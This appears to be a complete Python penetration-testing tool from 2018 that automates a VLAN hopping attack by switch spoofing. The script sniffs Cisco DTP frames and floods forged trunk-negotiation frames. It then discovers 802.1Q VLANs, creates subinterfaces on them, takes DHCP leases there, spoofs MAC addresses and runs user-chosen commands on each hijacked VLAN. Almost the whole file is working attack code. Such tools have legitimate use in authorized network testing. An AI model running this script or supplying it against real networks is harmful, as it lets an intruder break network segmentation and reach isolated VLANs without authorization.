#!/usr/bin/python

#
# This script is performing DTP Trunk mode detection and VLAN Hopping
# attack automatically, running sniffer afterwards to collect any other
# VLAN available. To be launched only in Unix/Linux environment as the 
# script utilizes following applications:
#   - 8021q.ko
#   - vconfig
#   - ifconfig / ip / route
#   - dhclient
#
# NOTICE: 
#   This program uses code written by 'floodlight', which comes from here:
#   https://github.com/floodlight/oftest/blob/master/src/python/oftest/afpacket.py
#
# TODO:
#   - Add logic that falls back to static IP address setup when DHCP fails
#   - Possibly implement custom ARP/ICMP/DHCP spoofers
#
# Mariusz B. / mgeeky, '18
#

import os
import sys
import socket
import struct
import argparse
import tempfile
import commands
import threading
import subprocess
import fcntl, socket, struct

from ctypes import *

try:
    from scapy.all import *
except ImportError:
    print('[!] Scapy required: pip install scapy')
    sys.exit(1)


VERSION = '0.3'

config = {
    'verbose' : False,  
    'debug' : False,
    'force' : False,
    'count' : 10,
    'timeout' : 90,
    'analyse' : False,
    'interface' : '',
    'macaddr' : '',
    'inet' : '',
    'origmacaddr' : '',
    'commands' : [],
    'exitcommands' : [],
}

stopThreads = False
attackEngaged = False
dot1qSnifferStarted = False

vlansHijacked = set()
subinterfaces = set()

tempfiles = []


#
# ===============================================
# Floodlight's afpacket definitions
#

ETH_P_8021Q = 0x8100
SOL_PACKET = 263
PACKET_AUXDATA = 8
TP_STATUS_VLAN_VALID = 1 << 4

class struct_iovec(Structure):
    _fields_ = [
        ("iov_base", c_void_p),
        ("iov_len", c_size_t),
    ]

class struct_msghdr(Structure):
    _fields_ = [
        ("msg_name", c_void_p),
        ("msg_namelen", c_uint32),
        ("msg_iov", POINTER(struct_iovec)),
        ("msg_iovlen", c_size_t),
        ("msg_control", c_void_p),
        ("msg_controllen", c_size_t),
        ("msg_flags", c_int),
    ]

class struct_cmsghdr(Structure):
    _fields_ = [
        ("cmsg_len", c_size_t),
        ("cmsg_level", c_int),
        ("cmsg_type", c_int),
    ]

class struct_tpacket_auxdata(Structure):
    _fields_ = [
        ("tp_status", c_uint),
        ("tp_len", c_uint),
        ("tp_snaplen", c_uint),
        ("tp_mac", c_ushort),
        ("tp_net", c_ushort),
        ("tp_vlan_tci", c_ushort),
        ("tp_padding", c_ushort),
    ]

libc = CDLL("libc.so.6")
recvmsg = libc.recvmsg
recvmsg.argtypes = [c_int, POINTER(struct_msghdr), c_int]
recvmsg.retype = c_int

def enable_auxdata(sk):
    """
    Ask the kernel to return the VLAN tag in a control message

    Must be called on the socket before afpacket.recv.
    """
    sk.setsockopt(SOL_PACKET, PACKET_AUXDATA, 1)

def recv(sk, bufsize):
    """
    Receive a packet from an AF_PACKET socket
    @sk Socket
    @bufsize Maximum packet size
    """
    buf = create_string_buffer(bufsize)

    ctrl_bufsize = sizeof(struct_cmsghdr) + sizeof(struct_tpacket_auxdata) + sizeof(c_size_t)
    ctrl_buf = create_string_buffer(ctrl_bufsize)

    iov = struct_iovec()
    iov.iov_base = cast(buf, c_void_p)
    iov.iov_len = bufsize

    msghdr = struct_msghdr()
    msghdr.msg_name = None
    msghdr.msg_namelen = 0
    msghdr.msg_iov = pointer(iov)
    msghdr.msg_iovlen = 1
    msghdr.msg_control = cast(ctrl_buf, c_void_p)
    msghdr.msg_controllen = ctrl_bufsize
    msghdr.msg_flags = 0

    rv = recvmsg(sk.fileno(), byref(msghdr), 0)
    if rv < 0:
        raise RuntimeError("recvmsg failed: rv=%d", rv)

    # The kernel only delivers control messages we ask for. We
    # only enabled PACKET_AUXDATA, so we can assume it's the
    # only control message.
    assert msghdr.msg_controllen >= sizeof(struct_cmsghdr)

    cmsghdr = struct_cmsghdr.from_buffer(ctrl_buf) # pylint: disable=E1101
    assert cmsghdr.cmsg_level == SOL_PACKET
    assert cmsghdr.cmsg_type == PACKET_AUXDATA

    auxdata = struct_tpacket_auxdata.from_buffer(ctrl_buf, sizeof(struct_cmsghdr)) # pylint: disable=E1101

    if auxdata.tp_vlan_tci != 0 or auxdata.tp_status & TP_STATUS_VLAN_VALID:
        # Insert VLAN tag
        tag = struct.pack("!HH", ETH_P_8021Q, auxdata.tp_vlan_tci)
        return buf.raw[:12] + tag + buf.raw[12:rv]
    else:
        return buf.raw[:rv]

#
# ===============================================
#

class Logger:
    @staticmethod
    def _out(x): 
        if config['debug'] or config['verbose']: 
            sys.stdout.write(x + '\n')

    @staticmethod
    def dbg(x):
        if config['debug']: 
            sys.stdout.write('[dbg] ' + x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[.] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[?] ' + x)
    
    @staticmethod
    def err(x): 
        sys.stdout.write('[!] ' + x + '\n')
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)

def inspectPacket(dtp):
    tlvs = dtp['DTP'].tlvlist
    stat = -1
    for tlv in tlvs:
        if tlv.type == 2:
            stat = ord(tlv.status)
            break

    ret = True 
    if stat == -1:
        Logger.fail('Something went wrong: Got invalid DTP packet.')
        ret = False

    elif stat == 2:
        Logger.fail('DTP disabled, Switchport in Access mode configuration')
        print('[!] VLAN Hopping is not possible.')
        ret = False

    elif stat == 3:
        Logger.ok('DTP enabled, Switchport in default configuration')
        print('[+] VLAN Hopping is possible.')

    elif stat == 4 or stat == 0x84:
        Logger.ok('DTP enabled, Switchport in Dynamic Auto configuration')
        print('[+] VLAN Hopping is possible.')

    elif stat == 0x81:
        Logger.ok('DTP enabled, Switchport in Trunk configuration')
        print('[+] VLAN Hopping IS possible.')

    elif stat == 0xa5:
        Logger.info('DTP enabled, Switchport in Trunk with 802.1Q encapsulation forced configuration')
        print('[?] VLAN Hopping may be possible.')

    elif stat == 0x42:
        Logger.info('DTP enabled, Switchport in Trunk with ISL encapsulation forced configuration')
        print('[?] VLAN Hopping may be possible.')

    if ret:
        print('[>] After Hopping to other VLANs - leave this program running to maintain connections.')

    return ret

def floodTrunkingRequests():
    while not stopThreads:
        # Ethernet
        dot3 = Dot3(src = config['macaddr'], dst = '01:00:0c:cc:cc:cc', len = 42)

        # Logical-Link Control
        llc = LLC(dsap = 0xaa, ssap = 0xaa, ctrl = 3)
        
        # OUT = Cisco, Code = DTP
        snap = SNAP(OUI = 0x0c, code = 0x2004)

        # DTP, Status = Access/Desirable (3), Type: Trunk (3)
        dtp = DTP(ver = 1, tlvlist = [
            DTPDomain(length = 13, type = 1, domain = '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'),
            DTPStatus(status = '\\x03', length = 5, type = 2),
            DTPType(length = 5, type = 3, dtptype = '\\xa5'),
            DTPNeighbor(type = 4, neighbor = config['macaddr'], len = 10)
        ])

        frame = dot3 / llc / snap / dtp

        Logger.dbg('SENT: DTP Trunk Keep-Alive:\n{}'.format(frame.summary()))
        send(frame, iface = config['interface'], verbose = False)

        time.sleep(30)

def engageDot1qSniffer():
    global dot1qSnifferStarted

    if dot1qSnifferStarted:
        return 

    dot1qSnifferStarted = True

    Logger.info('Starting VLAN/802.1Q sniffer.')

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((config['interface'], ETH_P_ALL))
    enable_auxdata(sock)

    print('[>] Discovering new VLANs...')
    
    while not stopThreads:     
        buf = recv(sock, 65535)
        pkt = Ether(buf)

        if pkt.haslayer(Dot1Q):
            dot1q = pkt.vlan
            if dot1q not in vlansHijacked:
                print('==> VLAN discovered: {}'.format(dot1q))
                vlansHijacked.add(dot1q)

                if not config['analyse']:
                    t = threading.Thread(target = addVlanIface, args = (dot1q, ))
                    t.daemon = True
                    t.start()
                else:
                    Logger.info('Analysis mode: Did not go any further.')

    Logger.info('Stopped VLAN/802.1Q sniffer.')

def processDtps(dtps):
    global attackEngaged

    if stopThreads: return
    
    if attackEngaged == False:
        success = False
        for dtp in dtps:
            if dtp.haslayer(DTP):
                if inspectPacket(dtp):
                    success = True
                    break

        if success:
            Logger.ok('VLAN Hopping via Switch Spoofing may be possible.')
            Logger.ok('Flooding with fake Access/Desirable DTP frames...\n')

            t = threading.Thread(target = floodTrunkingRequests)
            t.daemon = True
            t.start()

            attackEngaged = True
            time.sleep(5)

    if attackEngaged:
        engageDot1qSniffer()
            
def launchCommand(subif, cmd):
    # following placeholders in command: 
    # $GW (gateway), 
    # $MASK (full mask), 

    Logger.dbg('Subinterface: {}, Parsing command: "{}"'.format(subif, cmd))   

    if '%IFACE' in cmd: cmd = cmd.replace('%IFACE', subif)
    if '%HWADDR' in cmd: cmd = cmd.replace('%HWADDR', getHwAddr(subif))
    if '%IP'    in cmd: cmd = cmd.replace('%IP', getIfaceIP(subif))
    if '%NET'   in cmd: cmd = cmd.replace('%NET', shell("route -n | grep " + subif + " | grep -v UG | awk '{print $1}' | head -1"))
    if '%MASK'  in cmd: cmd = cmd.replace('%MASK', shell("route -n | grep " + subif + " | grep -v UG | awk '{print $3}' | head -1"))
    if '%GW'    in cmd: cmd = cmd.replace('%GW', shell("route -n | grep " + subif + " | grep UG | awk '{print $2}' | head -1"))
    if '%CIDR'  in cmd: cmd = cmd.replace('%CIDR', '/' + shell("ip addr show " + subif + " | grep inet | awk '{print $2}' | cut -d/ -f2"))

    print('[>] Launching command: "{}"'.format(cmd))
    shell(cmd)

def launchCommands(subif, commands):
    for cmd in commands:
        launchCommand(subif, cmd)

def addVlanIface(vlan):
    global subinterfaces
    global tempfiles

    subif = '{}.{}'.format(config['interface'], vlan)

    if subif in subinterfaces:
        Logger.fail('Already created that subinterface: {}'.format(subif))
        return

    Logger.info('Creating new VLAN Subinterface for {}.'.format(vlan))

    out = shell('vconfig add {} {}'.format(
        config['interface'], vlan
    ))

    if out.startswith('Added VLAN with VID == {}'.format(vlan)):
        subinterfaces.add(subif)

        pidFile = tempfile.NamedTemporaryFile().name
        dbFile = tempfile.NamedTemporaryFile().name

        tempfiles.append(pidFile)
        tempfiles.append(dbFile)

        Logger.info('So far so good, subinterface {} added.'.format(subif))

        ret = False
        for attempt in range(3):
            Logger.dbg('Acquiring DHCP lease for {}'.format(subif))
            
            shell('dhclient -lf {} -pf {} -r {}'.format(dbFile, pidFile, subif))
            time.sleep(3)
            
            if attempt > 0: 
                shell('dhclient -lf {} -pf {} -x {}'.format(dbFile, pidFile, subif))
                time.sleep(3)

            shell('dhclient -lf {} -pf {} {}'.format(dbFile, pidFile, subif))

            time.sleep(3)
            ip = getIfaceIP(subif)

            if ip:
                Logger.dbg('Subinterface has IP: {}'.format(ip))
                ret = True

                print('[+] Hopped to VLAN {}.: {}'.format(vlan, ip))
                launchCommands(subif, config['commands'])
                break

            time.sleep(5)

        if not ret:
            Logger.fail('Could not acquire DHCP lease for: {}'.format(subif))
            Logger.fail('Skipping...')

    else:
        Logger.fail('Failed.: "{}"'.format(out))

def packetCallback(pkt):
    Logger.dbg('RECV: ' + pkt.summary())

def sniffThread():
    global vlansHijacked

    warnOnce = False

    Logger.info('Sniffing for DTP frames (Max count: {}, Max timeout: {} seconds)...'.format(
        config['count'], config['timeout']
    ))

    while not stopThreads and not attackEngaged:
        try:
            dtps = sniff(
                count = config['count'], 
                filter = 'ether[20:2] == 0x2004',
                timeout = config['timeout'],
                prn = packetCallback,
                stop_filter = lambda x: x.haslayer(DTP) or stopThreads,
                iface = config['interface']
            )
        except Exception as e:
            if 'Network is down' in str(e):
                break
            Logger.err('Exception occured during sniffing: ' + str(e))

        if len(dtps) == 0 and not warnOnce:
            Logger.fail('It seems like there was no DTP frames transmitted.')
            Logger.fail('VLAN Hopping may not be possible (unless Switch is in Non-negotiate state):')
            Logger.info('\tSWITCH(config-if)# switchport nonnegotiate\t/ or / ')
            Logger.info('\tSWITCH(config-if)# switchport mode access')
            warnOnce = True

        if len(dtps) > 0 or config['force']:
            if len(dtps) > 0:
                Logger.dbg('Got {} DTP frames.\n'.format(
                    len(dtps)
                ))
            else:
                Logger.info('Forced mode: Beginning attack blindly.')

            t = threading.Thread(target = processDtps, args = (dtps, ))
            t.daemon = True
            t.start()

    Logger.dbg('Stopped sniffing.')

def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

def getIfaceIP(iface):
    out = shell("ip addr show " + iface + " | grep inet | awk '{print $2}' | head -1 | cut -d/ -f1")
    Logger.dbg('Interface: {} has IP: {}'.format(iface, out))
    return out

def changeMacAddress(iface, mac):
    old = getHwAddr(iface)
    Logger.dbg('Changing MAC address of interface {}, from: {} to: {}'.format(
        iface, old, mac
    ))
    shell('ifconfig {} down'.format(iface))
    shell('ifconfig {} hw ether {}'.format(iface, mac))
    shell('ifconfig {} up'.format(iface))
    
    ret = old != getHwAddr(iface)
    if ret:
        Logger.dbg('Changed.')
    else:
        Logger.dbg('Not changed.')

    return ret

def assure8021qCapabilities():
    if ('not found' in shell('modprobe -n 8021q')):
        Logger.err('There is no kernel module named: "8021q". Fatal error.')
        return False

    if not shell('which vconfig'):
        Logger.err('There is no "vconfig" utility. Package required: "vconfig". Fatal error.')
        return False

    shell('modprobe 8021q')

    return True

def shell(cmd):
    out = commands.getstatusoutput(cmd)[1]
    Logger.dbg('shell("{}") returned:\n"{}"'.format(cmd, out))
    return out

def selectDefaultInterface():
    global config
    commands = {
        'ip' :      "ip route show | grep default | awk '{print $5}' | head -1",
        'ifconfig': "route -n | grep 0.0.0.0 | grep 'UG' | awk '{print $8}' | head -1",
    }

    for k, v in commands.items():
        out = shell(v)
        if len(out) > 0:
            Logger.info('Default interface lookup command returned:\n{}'.format(out))
            config['interface'] = out
            return out

    return ''

def cleanup():
    if config['origmacaddr'] != config['macaddr']:
        Logger.dbg('Restoring original MAC address...')
        changeMacAddress(config['interface'], config['origmacaddr'])

    for subif in subinterfaces:
        Logger.dbg('Removing subinterface: {}'.format(subif))

        launchCommands(subif, config['exitcommands'])
        shell('vconfig rem {}'.format(subif))

    Logger.dbg('Removing temporary files...')
    for file in tempfiles:
        os.remove(file)

def parseOptions(argv):
    print('''
        :: VLAN Hopping via DTP Trunk negotiation 
        Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
        Mariusz B. / mgeeky, '18
        v{}
'''.format(VERSION))

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options]')
    parser.add_argument('-i', '--interface', metavar='DEV', default='', help='Select interface on which to operate.')
    parser.add_argument('-e', '--execute', dest='command', metavar='CMD', default=[], action='append', help='Launch specified command after hopping to new VLAN. One can use one of following placeholders in command: %%IFACE (choosen interface), %%IP (acquired IP), %%NET (net address), %%HWADDR (MAC), %%GW (gateway), %%MASK (full mask), %%CIDR (short mask). For instance: -e "arp-scan -I %%IFACE %%NET%%CIDR". May be repeated for more commands. The command will be launched SYNCHRONOUSLY, meaning - one have to append "&" at the end to make the script go along.')
    parser.add_argument('-E', '--exit-execute', dest='exitcommand', metavar='CMD', default=[], action='append', help='Launch specified command at the end of this script (during cleanup phase).')
    parser.add_argument('-m', '--mac-address', metavar='HWADDR', dest='mac', default='', help='Changes MAC address of the interface before and after attack.')
    parser.add_argument('-f', '--force', action='store_true', help='Attempt VLAN Hopping even if DTP was not detected (like in Nonegotiate situation).')
    parser.add_argument('-a', '--analyse', action='store_true', help='Analyse mode: do not create subinterfaces, don\'t ask for DHCP leases.')
    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')

    args = parser.parse_args()

    config['verbose'] = args.verbose
    config['debug'] = args.debug
    config['analyse'] = args.analyse
    config['force'] = args.force
    config['interface'] = args.interface
    config['commands'] = args.command
    config['exitcommands'] = args.exitcommand

    return args

def main(argv):
    global config
    global stopThreads

    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    if os.getuid() != 0:
        Logger.err('This program must be run as root.')
        return False

    load_contrib('dtp')

    if not assure8021qCapabilities():
        Logger.err('Unable to proceed.')
        return False

    if not opts.interface:
        if not selectDefaultInterface():
            Logger.err('Could not find suitable interface. Please specify it.')
            return False
    
    print('[>] Interface to work on: "{}"'.format(config['interface']))

    config['origmacaddr'] = config['macaddr'] = getHwAddr(config['interface'])
    if not config['macaddr']:
        Logger.err('Could not acquire MAC address of interface: "{}"'.format(
            config['interface']
        ))
        return False
    else:
        Logger.dbg('Interface "{}" has MAC address: "{}"'.format(
            config['interface'], config['macaddr']
        ))

    config['inet'] = getIfaceIP(config['interface'])
    if not config['inet']:
        Logger.fail('Could not acquire interface\'s IP address! Proceeding...')

    oldMac = config['macaddr']
    if opts.mac:
        oldMac = changeMacAddress(config['interface'], opts.mac)
        if oldMac:
            config['macaddr'] = opts.mac
        else:
            Logger.err('Could not change interface\'s MAC address!')
            return False

    t = threading.Thread(target = sniffThread)
    t.daemon = True
    t.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print('\n[>] Cleaning up...')

    stopThreads = True
    time.sleep(3)

    cleanup()
    return True

if __name__ == '__main__':
    main(sys.argv)
